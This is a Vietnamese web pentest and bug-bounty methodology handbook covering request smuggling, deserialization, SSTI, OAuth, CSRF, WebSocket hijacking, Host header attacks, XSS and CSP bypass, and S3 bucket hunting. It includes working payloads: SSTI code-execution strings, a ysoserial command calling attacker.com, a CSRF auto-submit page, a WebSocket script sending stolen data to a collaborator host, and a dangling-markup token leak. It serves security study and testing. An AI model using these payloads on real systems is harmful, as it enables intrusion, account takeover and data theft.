# Cẩm Nang Phương Pháp Khai Thác Lỗ Hổng (Vulnerability Methodology)

Tài liệu tổng hợp các phương pháp, quy trình và kỹ thuật kiểm thử thực chiến đối với các lớp lỗ hổng bảo mật phổ biến trong Web Pentest và Bug Bounty.


## 1. HTTP Request Smuggling (Buôn Lậu Yêu Cầu HTTP)

- **Bước 1:** Chuột phải vào tên miền FQDN trên Burp Suite -> Chọn **Smuggle Probe** (Sử dụng extension HTTP Request Smuggler).
- **Bước 2:** Nếu phát hiện dấu hiệu lỗ hổng, nhấp chuột trái vào mục **"Issue"** -> chuyển sang tab **"Request 1"** -> chọn biến thể phát hiện: `CL.TE` hoặc `TE.CL`.
  *(Nếu lỗ hổng xuất hiện trên nhiều thư mục/đường dẫn, mở rộng cây thư mục và chọn đúng path bị ảnh hưởng).*
- **Bước 3:** Chỉnh sửa phần tiền tố (prefix) của payload để đáp ứng yêu cầu kịch bản tấn công (đánh cắp phiên làm việc, bypass xác thực hoặc đầu độc bộ nhớ đệm).
- **Bước 4:** Tiến hành tấn công (Attack) và theo dõi phản hồi.



## 2. Insecure Deserialization (Giải Chuỗi Không An Toàn)

### Kiểm Thử Hộp Đen (Black-Box)

- **Bước 1: Xác định ngôn ngữ lập trình của ứng dụng** -> Tìm hiểu định dạng dữ liệu tuần tự hóa (serialized data) của ngôn ngữ đó:
  - **PHP:** Bắt đầu bằng cấu trúc định danh kiểu, ví dụ:  
    `O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}`
  - **Java:** Đối tượng tuần tự hóa thường bắt đầu bằng byte magic:  
    - Dạng Hex: `ac ed`
    - Dạng Base64: `rO0`
  - **Ruby:** Chuỗi Marshal bắt đầu bằng `\x04\x08` (Base64: `BAh...`)
  - **Python:** Pickle bytecode, thường chứa chuỗi `c__builtin__`, `cos`, `cposix` hoặc opcode `cos\nsystem`.
  - **.NET:** Thường gặp qua BinaryFormatter hoặc ViewState.

- **Bước 2: Tìm kiếm dữ liệu tuần tự hóa do người dùng kiểm soát** (trong cookie, tham số POST, header HTTP, body API).

- **Bước 3: Lựa chọn phương pháp tấn công phù hợp nhất:**
  1. **Chỉnh sửa trực tiếp đối tượng:** Sửa đổi giá trị trường trong chuỗi byte/văn bản (ví dụ: đổi `isLoggedIn` từ `0` thành `1`, đổi tên user thành `admin`). Lưu ý cập nhật lại độ dài chuỗi ký tự (string length) nếu thay đổi giá trị trong PHP.
  2. **Tự viết script sinh payload:** Dùng chính ngôn ngữ đó để tạo và tuần tự hóa đối tượng độc hại (object gadget).
  3. **Sử dụng công cụ có sẵn để sinh Gadget Chain:**
     - **PHP -> `PHPGCC` (PHP Generic Gadget Chains):**
       - Lệnh thực thi: `exec` | `system` | `passthru`
       - Cú pháp:  
         `./phpggc [GADGET_CHAIN] [FUNCTION] [COMMAND] | base64 -w 0 | xclip -selection clipboard`
       - Nếu ứng dụng có chữ ký bảo vệ (HMAC): Thêm payload đã encode và secret key (thu thập được qua file lộ lọt hoặc `phpinfo()`) vào script tạo chữ ký (ví dụ: `sha1-hmac-generator.php`).
     - **Java -> `ysoserial`:**
       - Payload nên được **URL encode toàn bộ** khi gửi qua cookie bị lỗ hổng.
       - Cú pháp ví dụ: `java -jar ysoserial-all.jar CommonsCollections4 'curl attacker.com' | base64`
     - **Ruby -> `universal_deserialization_gadget` / `marshaler`**

### Kiểm Thử Hộp Trắng (White-Box)

- **Bước 1: Rà quét mã nguồn theo các từ khóa / hàm xử lý nhạy cảm:**
  - **PHP:** `serialize()` | `unserialize()`
  - **Java:** `java.io.Serializable` | `readObject()` | `InputStream` | `ObjectInputStream`
  - **Python:** `pickle.loads()` | `yaml.load()` (khi không dùng SafeLoader)
  - **Ruby:** `Marshal.load()`



## 3. Prototype Pollution (Làm Ô Nhiễm Prototype Trong JavaScript)

- **Bước 1: Xác định lỗ hổng bằng payload / scanner** (Kiểm tra xem việc chèn `__proto__[test]=123` hoặc `constructor[prototype][test]=123` có làm thuộc tính xuất hiện trên đối tượng toàn cục không).
- **Bước 2: Tìm kiếm Gadget có thể khai thác:**
  - Tham khảo danh sách Gadget đã biết: [Gist Fingerprint.js của Nikita Stupin](https://gist.github.com/nikitastupin/b3b64a9f8c0eb74ce37626860193eaec)
  - Nhận diện các thư viện frontend/backend đang dùng qua **Wappalyzer** hoặc **BuiltWith**.
- **Bước 3: Nếu không tìm thấy Gadget có sẵn:**
  - Kiểm tra bằng tiện ích mở rộng **Untrusted-Types** trong Developer Tools Console để theo dõi luồng gán dữ liệu vào các DOM Sink nhạy cảm.



## 4. Server-Side Template Injection (SSTI)

- **Bước 1: Nhận diện lỗ hổng:**
  - Dữ liệu phản xạ (Reflected input) nhưng không dính XSS (không hiển thị mã HTML, thẻ bị encode hoặc báo lỗi) -> Thử thoát chuỗi bằng cú pháp Template Engine:  
    `http://vulnerable.com/?greeting=data.username}}<tag>`  
    *Nếu không có gì thay đổi, có thể do sai cú pháp template hoặc trang không bị lỗ hổng.*
  - Dùng Burp Bounty hoặc test thủ công bằng phép toán số học để xem kết quả tính toán trên máy chủ:  
    `http://vulnerable.com/?greeting=${7*7}` hoặc `{{7*7}}` -> Kiểm tra xem phản hồi có trả về `49` không.
- **Bước 2: Xác định loại Template Engine đang chạy:**
  - Dựa trên cây quyết định (Template Decision Tree):  
    [PortSwigger Template Decision Tree](https://portswigger.net/web-security/images/template-decision-tree.png)
  - Thử lần lượt các cú pháp: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`.
- **Bước 3: Khai thác lỗ hổng để chiếm quyền RCE:**
  - **Jinja2 (Python):** `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
  - **Twig (PHP):** `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
  - **Freemarker (Java):** `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`

---

## 5. Tấn Công Giao Thức OAuth 2.0 & OpenID Connect

### Các Bước Trong Luồng OAuth Chuẩn (Authorization Code Grant)

1. **Yêu cầu ủy quyền (Authorization Request):**
   - Các tham số phổ biến: `client_id`, `redirect_uri`, `response_type`, `scope`, `state`.
   - Ví dụ:
     ```http
     GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
     Host: oauth-authorization-server.com
     ```
2. **Người dùng đồng ý cấp quyền (User Consent).**
3. **Cấp mã ủy quyền (Authorization Code Grant):**
   - Các tham số phổ biến: `code`, `state`.
   - **Lưu ý bảo mật:** Luồng này rất dễ dính **CSRF** nếu thiếu hoặc không kiểm tra chặt chẽ giá trị `state`.
   - Ví dụ:
     ```http
     GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
     Host: client-app.com
     ```
4. **Yêu cầu Access Token (Access Token Request):**
   - Các tham số: `client_secret`, `grant_type`, `client_id`, `redirect_uri`, `code`.
   - Ví dụ:
     ```http
     POST /token HTTP/1.1
     Host: oauth-authorization-server.com

     client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
     ```
5. **Cấp Access Token (Access Token Grant):** Máy chủ OAuth phản hồi kèm theo Bearer Token.
6. **Gọi API dịch vụ (API Call):** Gửi kèm header `Authorization: Bearer <TOKEN>`.
7. **Trả về tài nguyên (Resource Grant):** Máy chủ trả về thông tin nhạy cảm của người dùng.

### Quy Trình Kiểm Thử OAuth

- **Bước 1:** Tìm kiếm trong lịch sử lưu lượng (HTTP History) các tham số OAuth đã biết:
  - `client_id`, `redirect_uri`, `response_type`, `state`.
- **Bước 2:** Gửi request `GET` tới các endpoint khám phá cấu hình OAuth/OIDC tiêu chuẩn:
  - `/.well-known/oauth-authorization-server`
  - `/.well-known/openid-configuration`
- **Bước 3: Xác định Grant Type (qua tham số `response_type`):**
  - **Authorization Code:** `response_type=code`
  - **Implicit Flow:** `response_type=token` (thường gặp trong Single Page Apps và ứng dụng di động/desktop).
- **Bước 4: Xác định các lỗi cấu hình có thể khai thác:**
  - **Với Implicit Flow:** Dữ liệu trong `POST` request không được server xác thực nguồn gốc khi thiết lập phiên -> Dễ bị giả mạo User ID/Token.
  - **Với Authorization Code:** Không sử dụng tham số `state` (hoặc `state` cố định/không đoán được) -> Tấn công **OAuth Account-Linking CSRF** (buộc tài khoản của nạn nhân liên kết với tài khoản mạng xã hội của kẻ tấn công).
  - **Đánh cắp Code / Token qua tham số `redirect_uri`:**
    - Các kịch bản vượt qua whitelist của `redirect_uri`:
      1. Chuyển hướng tới domain bất kỳ.
      2. Chuyển hướng tới bất kỳ subdomain nào của công ty.
      3. Chuyển hướng tới các domain cụ thể khác.
      4. Chuyển hướng tới một domain hợp lệ nhưng mọi đường dẫn (paths) tùy ý (tìm Open Redirect tại đó).
      5. Chuyển hướng tới đường dẫn cụ thể.
      6. Chuyển hướng tới whitelist domain/path được lọc bằng Regex lỏng lẻo (ví dụ: `target.com.evil.com` hoặc `target.com?@evil.com`).
      7. Thử kỹ thuật **Parameter Pollution** (`&redirect_uri=attacker.com`), kỹ thuật bypass phòng thủ SSRF/CORS, sử dụng DNS trỏ về local (`localhost.evil-server.net`), v.v.
    - **Quy trình tấn công:**
      - Bước 1: Gửi URL độc hại có chứa `redirect_uri` đã bị đầu độc tới nạn nhân.
      - Bước 2: Nạn nhân bấm vào, server OAuth cấp code/token chuyển hướng về server kẻ tấn công.
      - Bước 3: Kẻ tấn công lấy code/token đó để đăng nhập vào tài khoản nạn nhân.
      *(Lưu ý: Nếu tham số `redirect_uri` bắt buộc phải khớp chính xác khi đổi token ở backend, bước đổi token có thể thất bại).*
    - **Đánh cắp dữ liệu tham số từ URL Fragment (#):**
      ```html
      <script>
          if (document.location.hash){
              console.log("Tìm thấy Hash -- đang chuyển hướng...");
              window.location = '/?' + document.location.hash.substr(1);
          } else {
              console.log("Không tìm thấy hash trong URL");
          }
      </script>
      ```
  - **Leo thang phạm vi quyền hạn (Scope Upgrade):**
    - *Authorization Code:* Đăng ký ứng dụng với máy chủ OAuth -> Nạn nhân đồng ý cấp quyền hạn chế -> Ứng dụng độc hại gửi `POST` tới `/token` yêu cầu mở rộng thêm `scope`. Nếu máy chủ không đối chiếu scope ở bước đổi token với request ban đầu, token trả về sẽ có toàn quyền.
    - *Implicit:* Đánh cắp access token -> Gửi request thủ công kèm scope mở rộng.
  - **Đăng ký bằng email nạn nhân để chiếm đoạt tài khoản (Pre-Account Takeover):** Đăng ký tài khoản trước bằng email của nạn nhân chưa kích hoạt, sau đó khi nạn nhân đăng nhập qua OAuth sẽ bị liên kết nhầm vào tài khoản kẻ tấn công sở hữu.

### OpenID Connect Kết Hợp OAuth

- Sử dụng định dạng JWT (`id_token`).
- Khóa ký công khai lộ tại: `/.well-known/jwks.json`.
- File cấu hình hệ thống: `/.well-known/openid-configuration`.
- Có thể kết hợp nhiều grant type: `response_type=id_token token` hoặc `response_type=id_token code`.
- **Kiểm thử:**
  - Bước 1: Kiểm tra tính năng đăng ký Client động (Dynamic Client Registration - có yêu cầu Bearer token xác thực không?).
  - Bước 2: Tạo payload đăng ký độc hại (`logo_uri`, `jwks_uri`) để kích hoạt tấn công **SSRF**.

---

## 6. Tấn Công CSRF (Cross-Site Request Forgery)

### Bước 1: Xác định 3 điều kiện tiên quyết
1. **Hành động có ý nghĩa (Relevant Action):** Một hành động thay đổi trạng thái trong ứng dụng mà kẻ tấn công muốn nạn nhân thực thi (đổi email, đổi mật khẩu, chuyển tiền, tạo API key).
2. **Quản lý phiên dựa trên Cookie (Cookie-based Session Handling):** Ứng dụng dùng cookie để duy trì phiên (KHÔNG dùng header `Authorization: Bearer`).
3. **Không có tham số yêu cầu khó đoán (No Unpredictable Request Parameters):** Không có CSRF Token ngẫu nhiên, hoặc hệ thống không yêu cầu nhập lại mật khẩu hiện tại khi thực hiện thay đổi.

### Bước 2: Xây dựng trang web độc hại để khai thác
- **Tự viết mã HTML PoC:**
  ```html
  <html>
      <body>
          <form action="https://vulnerable-website.com/email/change" method="POST">
              <input type="hidden" name="email" value="pwned@evil-user.net" />
          </form>
          <script>
              document.forms[0].submit();
          </script>
      </body>
  </html>
  ```
- **Sử dụng Burp Suite Professional:**
  1. Chọn request mục tiêu trong HTTP history.
  2. Chuột phải -> **Engagement Tools** -> **Generate CSRF PoC**.
  3. Tùy chỉnh code PoC nếu cần (chọn auto-submit).
  4. Lưu file và host thử nghiệm trên máy chủ bên ngoài (như AWS EC2 / VPS).

---

## 7. Lỗ Hổng Bảo Mật Trong WebSockets

- Các tin nhắn WebSocket có thể bắt và chỉnh sửa (intercept) trong Burp Suite tương tự như các yêu cầu HTTP/HTTPS thông thường.
- Cấu hình hướng bắt gói tin trong tab Options: **Client-to-Server** hoặc **Server-to-Client**.

### Thao túng Quá Trình Bắt Tay WebSocket (Handshake Manipulation)
- **Tại sao cần làm điều này?**
  - Mở rộng bề mặt tấn công (quan trọng nhất).
  - Thao tác tấn công có thể làm ngắt kết nối hiện tại.
  - Token xác thực bị hết hạn.
- **Cách thực hiện:**
  - Bước 1: Chuyển request bắt tay sang **Burp Repeater** -> Nhấp vào **biểu tượng cây bút (Pencil Icon)** bên cạnh URL WebSocket.
  - Bước 2: Chọn tạo kết nối mới (Clone) hoặc kết nối lại (Reconnect).
  - Bước 3: Chỉnh sửa các header hoặc tham số kết nối theo ý muốn.
  - Bước 4: Bấm **"Connect"** để khởi tạo quá trình bắt tay.

### Xác Định Các Khiếm Khuyết Thiết Kế
- Quá tin tưởng vào các header bảo mật HTTP ban đầu.
- Thiếu sót trong cơ chế quản lý phiên sau khi đã chuyển sang WebSocket.
- Bề mặt tấn công mở rộng thông qua các header HTTP tùy chỉnh.

### Cross-Site WebSocket Hijacking (CSWSH)
- Xác định request bắt tay HTTP WebSocket **không có CSRF token** hoặc token một lần không thể đoán trước.
- Phiên làm việc phải được xác thực hoàn toàn thông qua **Cookie** (giống hệt điều kiện CSRF).
- **Lưu ý:** Header `Sec-WebSocket-Key` **KHÔNG PHẢI** là cơ chế xác thực hay quản lý phiên; nó chỉ dùng để chống việc caching proxy nhầm lẫn.
- **Mã PoC khai thác trên trang độc hại:**
  ```html
  <script>
      var websocket = new WebSocket('wss://vulnerable-websocket-URL');
      websocket.onopen = start;
      websocket.onmessage = handleReply;

      function start(event) {
          websocket.send("READY");
      }

      function handleReply(event) {
          // Trích xuất dữ liệu nhạy cảm gửi về Collaborator/Server của kẻ tấn công:
          fetch('https://your-collaborator-domain/?' + encodeURIComponent(event.data), {mode: 'no-cors'});
      }
  </script>
  ```

---

## 8. Tấn Công HTTP Host Header (Host Header Attacks)

### Lý do nhiều ứng dụng cùng chia sẻ một địa chỉ IP:
1. **Virtual Hosting (VHosting):**
   - Nhiều ứng dụng thuộc cùng một chủ sở hữu.
   - Nhiều ứng dụng thuộc nhiều khách hàng khác nhau (phổ biến trong mô hình SaaS, shared hosting).
2. **Lưu lượng được định tuyến qua máy chủ trung gian:**
   - Ứng dụng thực sự nằm ở máy chủ nội bộ (back-end servers).
   - Lưu lượng đi qua Load Balancer (Bộ cân bằng tải) hoặc Reverse Proxy (Proxy ngược).
   - Cực kỳ phổ biến khi ứng dụng đặt sau mạng phân phối nội dung (CDN như Cloudflare, Akamai, Fastly).

### Luồng xử lý khi trình duyệt gửi yêu cầu:
1. Trình duyệt gửi tên miền tới DNS Server -> DNS trả về IP Address.
2. Trình duyệt gửi HTTP Request tới IP đó kèm theo header `Host: target.com`.
3. Web Server/Proxy định tuyến request tới ứng dụng tương ứng dựa vào giá trị của `Host` Header.

### Các lỗ hổng tiềm năng có thể khai thác qua Host Header:
- **Web Cache Poisoning (Đầu độc bộ nhớ đệm web)**
- **Business Logic Flaws (Lỗi logic nghiệp vụ)**
- **SSRF (Server-Side Request Forgery qua định tuyến)**
- **Các lỗ hổng phía client:** XSS, SQLi, HTMLi (khi Host header được in phản xạ vào trang HTML).

### Kỹ Thuật Kiểm Thử Host Header

#### Bước 1: Nhận diện ứng dụng có bị ảnh hưởng
- **Truyền tên miền tùy ý vào Host Header:**
  - *Nếu vẫn truy cập được ứng dụng bình thường:* Máy chủ có cấu hình mặc định (default vhost) trỏ về ứng dụng khi nhận tên miền lạ -> Có thể tiếp tục tìm cách khai thác giá trị Host này được dùng ở đâu trong mã nguồn.
  - *Nếu không:*
    - Máy chủ có báo lỗi `"Invalid Host header"` không?
    - Request có bị chặn bởi WAF/Security Controls không?
    - Có thể thêm cổng phi số không? (Ví dụ: `Host: vulnerable-website.com:bad-stuff-here`).
    - Có thể thao túng header để bypass cơ chế lọc không? (Kỹ thuật tương tự SSRF).
- **Gửi hai header Host trùng lặp (Duplicate Host Headers):**
  ```http
  GET /example HTTP/1.1
  Host: vulnerable-website.com
  Host: bad-stuff-here
  ```
- **Gửi Absolute URL trong dòng Request Line:**
  ```http
  GET https://vulnerable-website.com/ HTTP/1.1
  Host: bad-stuff-here
  ```
- **Sử dụng khoảng trắng (space/tab) để vượt qua bộ lọc:**
  ```http
  GET /example HTTP/1.1
   Host: bad-stuff-here
  Host: vulnerable-website.com
  ```
- **Kết hợp với kỹ thuật HTTP Request Smuggling.**
- **Thử các header thay thế thường được các proxy trung gian sử dụng:**
  ```http
  GET /example HTTP/1.1
  Host: vulnerable-website.com
  X-Forwarded-Host: bad-stuff-here
  ```
  - `X-Forwarded-Host`
  - `X-Host`
  - `X-Forwarded-Server`
  - `X-HTTP-Host-Override`
  - `Forwarded`
  - Dùng tiện ích **Param Miner** trên Burp Suite để dò tìm các unkeyed header được hỗ trợ.

#### Bước 2: Khai thác lỗ hổng (Ví dụ điển hình: Password Reset Poisoning)
- **Cơ chế:** Kẻ tấn công ép ứng dụng gửi đường link đặt lại mật khẩu chứa tên miền do kẻ tấn công sở hữu.
- **Quy trình:**
  1. Lấy email/username của nạn nhân.
  2. Gửi form yêu cầu đặt lại mật khẩu, nhưng can thiệp HTTP Request để đổi `Host` (hoặc `X-Forwarded-Host`) thành server của kẻ tấn công (`attacker.com`).
  3. Nạn nhân nhận email đặt lại mật khẩu chứa đường link độc hại (ví dụ: `https://attacker.com/reset-password?token=XYZ`).
  4. Nạn nhân nhấp vào link, token bí mật được gửi trực tiếp đến server của kẻ tấn công.
  5. Kẻ tấn công dùng token đó truy cập trang web thật và đổi mật khẩu nạn nhân -> **Account Takeover hoàn toàn**.
  *(Ghi chú: Nếu không sửa được link reset, hãy kiểm tra HTML Injection trong email để chèn thêm nội dung hoặc link giả mạo).*

---

## 9. Kỹ Thuật XSS Nâng Cao (Advanced XSS)

> **Tài liệu tra cứu payload đầy đủ:** [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### Ba Phân Loại XSS
- **Reflected XSS:** Mã độc xuất phát trực tiếp từ HTTP Request hiện tại và được phản xạ trong phản hồi.
- **Stored XSS:** Mã độc được lưu trữ cố định trong cơ sở dữ liệu của ứng dụng và thực thi mỗi khi trang được tải.
- **DOM-based XSS:** Lỗ hổng nằm hoàn toàn trong mã JavaScript phía client (dữ liệu đọc từ source và truyền vào sink mà không qua kiểm tra).

### Khai Thác DOM-based XSS

Ứng dụng lấy dữ liệu do người dùng kiểm soát (**Source**) và truyền vào một hàm hỗ trợ thực thi mã động (**Sink**).

#### Các Nguồn Dữ Liệu Phổ Biến (Common Sources):
```javascript
window.location (URL)
location.search
location.hash
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

#### Các Đích Thực Thi Nguy Hiểm (Common Sinks):
```javascript
// Các sink thao tác trực tiếp với HTML / Script:
document.write()       // Có tác dụng với thẻ <script>
document.writeln()
document.domain
someDOMElement.innerHTML            // Kích hoạt qua thẻ <img> hoặc <iframe> (onerror/onload)
someDOMElement.outerHTML
someDOMElement.insertAdjacentHTML
someDOMElement.onevent

// Các phương thức jQuery nguy hiểm:
add(), after(), append(), animate()
attr()                 // Nguy hiểm với thuộc tính href (javascript:alert(1))
insertAfter(), insertBefore(), before()
html(), prepend(), replaceAll(), replaceWith()
wrap(), wrapInner(), wrapAll(), has()
constructor(), init(), index()
jQuery.parseHTML(), $.parseHTML()
```

#### Quy Trình Kiểm Thử Sinks:
- **Kiểm tra HTML Sinks (Dễ):**
  1. Gửi một chuỗi hash nhận diện duy nhất (như MD5 sum) vào Source.
  2. Mở DevTools và tìm kiếm chuỗi MD5 trong mã nguồn HTML (phím tắt `Ctrl + F`).
  3. Tinh chỉnh payload để phá vỡ ngữ cảnh HTML và thực thi mã.
- **Kiểm tra JavaScript Execution Sinks (Khó hơn):**
  1. Tìm kiếm toàn bộ mã nguồn JavaScript xem có biến nào đang đọc từ Source không (`Ctrl + Shift + F`).
  2. Đặt Breakpoint và chạy từng bước (step through) để theo dõi cách giá trị được sử dụng.
  3. Nếu giá trị của source được gán cho một biến, tìm kiếm các vị trí biến đó được sử dụng.
  4. Nếu biến đó được truyền vào một Sink, rê chuột qua biến để xem giá trị trước khi hàm thực thi.
  5. Tinh chỉnh payload để kích hoạt hàm.

#### Các Trường Hợp Framework Đặc Thù:
- **AngularJS:**
  - Tìm kiếm thuộc tính `ng-app`. Mọi đoạn mã nằm trong thẻ có `ng-app` đều có thể kích hoạt AngularJS Sandbox Escape.
  - Payload kinh điển: `{{$on.constructor('alert(1)')()}}`
- **Khi hàm `eval()` của JavaScript xử lý JSON Object:**
  - Payload bẻ ngoặc: `\"-alert(1)}//`

### Các Ngữ Cảnh XSS (Contexts)
- **Nằm giữa các thẻ HTML thông thường:** `<p>[USER INPUT]</p>`
  - Kẻ tấn công phải đưa vào các thẻ HTML mới để kích hoạt thực thi JavaScript.
  - *Bước 1:* Fuzz danh sách các thẻ HTML (tags) bị WAF chặn để tìm thẻ được phép.
  - *Bước 2:* Fuzz các thuộc tính / sự kiện (attributes / event handlers) được phép.
  - *Bước 3:* Fuzz payload thực thi.
  - *Bước 4:* Xây dựng payload hoàn chỉnh kết hợp giữa thẻ, thuộc tính và code được whitelist.

### Kỹ Thuật Bypass Content Security Policy (CSP)

#### Các Cơ Chế Kiểm Soát CSP Thường Gặp:
- **Header `Content-Security-Policy`:**
  - `script-src 'self'`: Chỉ cho phép nạp script từ cùng một domain gốc.
  - `script-src https://scripts.trusted-domain.com`: Chỉ cho phép script từ domain cụ thể.
- **Nonce (Giá trị ngẫu nhiên dùng một lần):**
  - Thẻ script phải chứa thuộc tính `nonce="RANDOM_VAL"` khớp với header CSP, nếu không script sẽ không chạy. Nonce phải được sinh ngẫu nhiên và bảo mật mỗi lần tải trang.
- **Hash (Mã băm SHA):**
  - Script nội tuyến phải có mã hash khớp với khai báo trong CSP.

#### Kỹ Thuật Dangling Markup Injection (Chèn Mã Đánh Dấu Treo)
- Hầu hết các chính sách CSP đều **không chặn thẻ `<img>`**.
- Lợi dụng việc chèn thẻ HTML có dấu mở ngoặc kép thuộc tính nhưng **không đóng ngoặc kép**, khiến trình duyệt tự động "nuốt" toàn bộ nội dung phía sau (bao gồm token CSRF, dữ liệu nhạy cảm) và gửi về máy chủ của kẻ tấn công dưới dạng tham số URL:
  - *Bước 1:* Xác định tên trường input chứa dữ liệu nhạy cảm cần lấy cắp.
  - *Bước 2:* Thêm tham số GET vào URL với tên tương ứng.
  - *Bước 3:* Giá trị tham số độc hại sẽ chứa mã Dangling Markup:
    ```html
    <input type="text" name="csrf" value="[PAYLOAD]"/>
    Payload = "><img src='//attacker-website.com?
    ```
  - Kết quả mã HTML bị render:
    ```html
    <input type="text" name="csrf" value=""><img src='//attacker-website.com?[DU_LIEU_NHAY_CAM_VA_CSRF_TOKEN]"/>
    ```
  - **Lưu ý quan trọng:** Hãy phân biệt dấu nháy đơn `'` và nháy kép `"`. Trình duyệt sẽ nuốt chuỗi cho đến khi gặp dấu nháy tương ứng tiếp theo trên trang.

---

## 10. Dò Quét Và Khai Thác AWS S3 Buckets

1. **Tìm kiếm các S3 Bucket mở công khai (Open S3 Buckets).**
2. **Tìm kiếm các tệp tin lưu trữ nhạy cảm:**
   - `.sql`, `.sql.gz`
   - `backup.zip`, `backup.gz`, `backup.tar`, `backup.tar.gz`
   - Các file `.env`, file cấu hình, khóa bí mật, mã nguồn.
3. **Công cụ tự động hóa - `S3Scanner`:**
   - Mã nguồn: [GitHub sa7mon/S3Scanner](https://github.com/sa7mon/S3Scanner)
   - Cài đặt và sử dụng:
     ```bash
     git clone https://github.com/sa7mon/S3Scanner.git
     cd S3Scanner
     pip3 install -r requirements.txt
     python3 -m S3Scanner
     ```
